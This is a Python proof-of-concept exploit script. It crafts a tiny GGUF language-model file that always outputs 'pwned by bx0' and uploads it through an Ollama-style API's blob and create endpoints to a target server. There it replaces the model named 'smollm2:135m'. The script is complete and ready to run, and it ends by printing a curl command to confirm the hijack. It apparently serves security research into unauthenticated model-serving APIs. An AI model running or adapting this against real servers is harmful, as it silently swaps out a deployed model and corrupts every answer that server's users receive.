#!/usr/bin/env python3
"""
Craft a minimal GGUF (llama arch, 260-token vocab, 1 layer, hidden=8)
whose output.weight is biased entirely to token 259 ("pwned by bx0").

Vocab: 256 gpt2 byte-level tokens (for encoding any input) + <unk> <s> </s> + target.
Zero attention/FFN weights => hidden state = embedding = [1,...,1]
output.weight row 259 = [100,...,100] => logit[259] = 800, all others = 0
=> model always outputs "pwned by bx0" regardless of input prompt.

Usage:
    python3 poc_gguf_hijack.py [target]
    python3 poc_gguf_hijack.py http://192.168.0.17:11434
"""
import hashlib, io, struct, sys, json, urllib.request, urllib.error

TARGET     = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.0.17:11434"
MODEL      = "smollm2:135m"
OUT_STRING = "pwnedĠbyĠbx0"  # Ġ = gpt2 byte-level space (U+0120)

# GGUF wire-type IDs
T_UINT32  = 4
T_FLOAT32 = 6
T_STRING  = 8
T_ARRAY   = 9

GGML_F32  = 0   # tensor type: 32-bit float
ALIGNMENT = 32  # default GGUF data alignment

# Model hyper-params
N_VOCAB  = 260  # 256 bytes + <unk> <s> </s> OUT_STRING
N_EMBD   = 8    # hidden dim  (must be divisible by N_HEAD)
N_LAYER  = 1
N_HEAD   = 1
N_KV_H   = 1
FFN      = 16
CTX      = 512
TGT_ID   = 259  # index of OUT_STRING (after 256 byte tokens + 3 special)

# 256 single-byte tokens (type 6 = BYTE), then special + target
TOKENS      = [chr(i) for i in range(256)] + ["<unk>", "<s>", "</s>", OUT_STRING]
TOKEN_TYPES = [6] * 256 + [2, 3, 3, 1]   # BYTE*256, UNKNOWN, CONTROL, CONTROL, NORMAL

# GGUF writer primitives
def w_str(b, s):
    enc = s.encode()
    b.write(struct.pack('<Q', len(enc)) + enc)


def w_kv_str(b, k, v):   w_str(b, k); b.write(struct.pack('<I', T_STRING));  w_str(b, v)
def w_kv_u32(b, k, v):   w_str(b, k); b.write(struct.pack('<II', T_UINT32,  v))
def w_kv_f32(b, k, v):   w_str(b, k); b.write(struct.pack('<If', T_FLOAT32, v))


def w_arr_str(b, k, vs):
    w_str(b, k); b.write(struct.pack('<I', T_ARRAY))
    b.write(struct.pack('<IQ', T_STRING, len(vs)))
    for v in vs: w_str(b, v)


def w_arr_u32(b, k, vs):
    w_str(b, k); b.write(struct.pack('<I', T_ARRAY))
    b.write(struct.pack('<IQ', T_UINT32, len(vs)))
    for v in vs: b.write(struct.pack('<I', v))


def w_arr_f32(b, k, vs):
    w_str(b, k); b.write(struct.pack('<I', T_ARRAY))
    b.write(struct.pack('<IQ', T_FLOAT32, len(vs)))
    for v in vs: b.write(struct.pack('<f', v))


def pad32(b):
    r = b.tell() % ALIGNMENT
    if r: b.write(b'\x00' * (ALIGNMENT - r))


def f32s(*vals): return struct.pack(f'<{len(vals)}f', *vals)

# Tensor table
def make_tensors():
    E, V, F = N_EMBD, N_VOCAB, FFN
    ow = [0.0] * (V * E)
    for i in range(E):
        ow[TGT_ID * E + i] = 100.0
    return [
        ("token_embd.weight",          [E, V],    [1.0] * (V * E)),
        ("output_norm.weight",         [E],        [1.0] * E),
        ("output.weight",              [E, V],    ow),
        ("blk.0.attn_norm.weight",     [E],        [1.0] * E),
        ("blk.0.attn_q.weight",        [E, E],    [0.0] * (E * E)),
        ("blk.0.attn_k.weight",        [E, E],    [0.0] * (E * E)),
        ("blk.0.attn_v.weight",        [E, E],    [0.0] * (E * E)),
        ("blk.0.attn_output.weight",   [E, E],    [0.0] * (E * E)),
        ("blk.0.ffn_norm.weight",      [E],        [1.0] * E),
        ("blk.0.ffn_gate.weight",      [E, F],    [0.0] * (E * F)),
        ("blk.0.ffn_up.weight",        [E, F],    [0.0] * (E * F)),
        ("blk.0.ffn_down.weight",      [F, E],    [0.0] * (F * E)),
    ]


def tensor_nbytes(ne):
    n = 1
    for d in ne: n *= d
    return n * 4  # F32

# GGUF assembly
def build_gguf():
    tensors = make_tensors()
    n_tensors = len(tensors)

    offsets, cur = [], 0
    for _, ne, _ in tensors:
        offsets.append(cur)
        sz = tensor_nbytes(ne)
        cur += sz + ((-sz) % ALIGNMENT)

    kv = io.BytesIO()
    w_kv_str(kv, 'general.architecture',                 'llama')
    w_kv_str(kv, 'general.name',                         'pwned')
    w_kv_u32(kv, 'general.file_type',                    0)
    w_kv_u32(kv, 'llama.context_length',                 CTX)
    w_kv_u32(kv, 'llama.embedding_length',               N_EMBD)
    w_kv_u32(kv, 'llama.block_count',                    N_LAYER)
    w_kv_u32(kv, 'llama.feed_forward_length',            FFN)
    w_kv_u32(kv, 'llama.attention.head_count',           N_HEAD)
    w_kv_u32(kv, 'llama.attention.head_count_kv',        N_KV_H)
    w_kv_f32(kv, 'llama.attention.layer_norm_rms_epsilon', 1e-5)
    w_kv_f32(kv, 'llama.rope.freq_base',                 10000.0)
    w_kv_u32(kv, 'llama.vocab_size',                     N_VOCAB)
    w_kv_str(kv, 'tokenizer.ggml.model',                 'gpt2')
    w_arr_str(kv, 'tokenizer.ggml.tokens',               TOKENS)
    w_arr_u32(kv, 'tokenizer.ggml.token_type',           TOKEN_TYPES)
    w_arr_f32(kv, 'tokenizer.ggml.scores',               [0.0] * N_VOCAB)
    w_arr_str(kv, 'tokenizer.ggml.merges',               [])
    w_kv_u32(kv, 'tokenizer.ggml.bos_token_id',          257)
    w_kv_u32(kv, 'tokenizer.ggml.eos_token_id',          258)
    n_kv = 19

    ti = io.BytesIO()
    for (name, ne, _), off in zip(tensors, offsets):
        w_str(ti, name)
        ti.write(struct.pack('<I', len(ne)))
        for d in ne: ti.write(struct.pack('<q', d))
        ti.write(struct.pack('<I', GGML_F32))
        ti.write(struct.pack('<Q', off))

    out = io.BytesIO()
    out.write(b'GGUF')
    out.write(struct.pack('<I', 3))
    out.write(struct.pack('<q', n_tensors))
    out.write(struct.pack('<q', n_kv))
    out.write(kv.getvalue())
    out.write(ti.getvalue())
    pad32(out)

    for i, (_, ne, vals) in enumerate(tensors):
        data = f32s(*vals)
        out.write(data)
        if i < n_tensors - 1:
            r = len(data) % ALIGNMENT
            if r: out.write(b'\x00' * (ALIGNMENT - r))

    return out.getvalue()

# Upload & install
def upload_blob(data):
    digest = 'sha256:' + hashlib.sha256(data).hexdigest()
    req = urllib.request.Request(
        f"{TARGET}/api/blobs/{digest}",
        data=data, method='POST',
        headers={'Content-Type': 'application/octet-stream',
                 'Content-Length': str(len(data))})
    try:
        urllib.request.urlopen(req, timeout=30)
    except urllib.error.HTTPError as e:
        if e.code not in (200, 201):
            raise
    print(f"[+] blob uploaded: {digest}")
    return digest


def install_model(digest):
    body = json.dumps({
        "model": MODEL,
        "files": {"model.gguf": digest},
        "parameters": {"num_predict": 1},
    }).encode()
    req = urllib.request.Request(
        f"{TARGET}/api/create", data=body,
        headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req, timeout=60) as r:
        for line in r:
            line = line.strip()
            if line:
                d = json.loads(line)
                print(f"  {d.get('status','')}", d.get('error',''))


if __name__ == '__main__':
    print(f"[*] target : {TARGET}")
    print(f"[*] model  : {MODEL}")
    print(f"[*] output : {OUT_STRING!r}")
    print()

    gguf = build_gguf()
    sha  = hashlib.sha256(gguf).hexdigest()
    print(f"[*] GGUF built: {len(gguf)} bytes  sha256:{sha[:16]}...")

    digest = upload_blob(gguf)
    print(f"[*] installing as {MODEL}...")
    install_model(digest)
    print()
    print("[*] test:")
    print(f"    curl -s -X POST {TARGET}/api/generate \\")
    print(f"      -d '{{\"model\":\"{MODEL}\",\"prompt\":\"hello\",\"stream\":false}}' | python3 -m json.tool")
